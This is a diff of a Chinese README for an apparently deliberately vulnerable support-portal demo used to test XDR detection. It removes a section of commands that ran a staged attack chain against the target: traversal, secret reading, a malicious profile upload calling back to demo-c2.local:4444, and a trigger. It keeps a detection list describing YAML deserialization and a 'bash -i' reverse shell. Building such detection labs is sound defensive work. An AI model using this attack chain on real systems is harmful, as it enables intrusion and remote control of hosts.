@@ -19,6 +19,8 @@
 
 ## 快速本地运行
 
+> **环境要求：** Python 3.10
+
 ```bash
 # 1. 激活 venv
 source .venv/bin/activate
@@ -34,14 +36,14 @@ python -m support_portal
 
 打开浏览器：
 - **`/`** — 客户上传页面
-- **`/admin`** — App Owner 诊断规则管理
+- **`/admin`** — Admin 诊断规则管理
 
 ## 目录结构
 
 ```
 src/support_portal/    应用源码
-demo_c2/               C2 listener（VM-2 部署）
-attack/                攻击演示脚本（12 步 walkthrough）
+demo_c2/               C2 listener + 攻击演示脚本（demo-attacker 部署）
+demo_c2/attack/        攻击演示脚本（12 步 walkthrough）
 tests/                 单元 + 端到端测试
 ```
 
@@ -52,25 +54,6 @@ pip install pytest pytest-asyncio
 pytest tests/ -v
 ```
 
-## 攻击演示
-
-```bash
-cd attack/
-
-# 生成 payload 文件
-./generate-evil-profile.sh demo-c2.local 4444
-./make-bundle.sh
-
-# 执行攻击链
-TARGET=<vm1-ip>:8080 ./01-fingerprint.sh
-TARGET=<vm1-ip>:8080 ./02-traversal-config.sh
-TARGET=<vm1-ip>:8080 ./03-traversal-token.sh
-TARGET=<vm1-ip>:8080 TOKEN=demo-profile-admin-token-2026 ./04-upload-evil-profile.sh
-TARGET=<vm1-ip>:8080 ./05-trigger.sh
-```
-
-详细说明见 [attack/README.md](attack/README.md)。
-
 ## XDR 检测点
 
 XDR 在主机侧可观察到的行为链：
@@ -78,7 +61,7 @@ XDR 在主机侧可观察到的行为链：
 1. 外部源对 8080 端口扫描 + `/static/../*` 异常路径访问
 2. aiohttp 进程读取 `/opt/support-portal/config/*`（正常范围之外）
 3. aiohttp 进程读取 `/opt/support-portal/secrets/*`
-4. `/internal/app-owner/profile/upload` 被外部 IP 调用
+4. `/internal/admin/profile/upload` 被外部 IP 调用
 5. `profiles/active.yaml` 被非预期覆盖
 6. Python 进程执行 `yaml.load` 触发 `!!python/object/apply` 反序列化
 7. `python` → `bash -i` 子进程 spawn
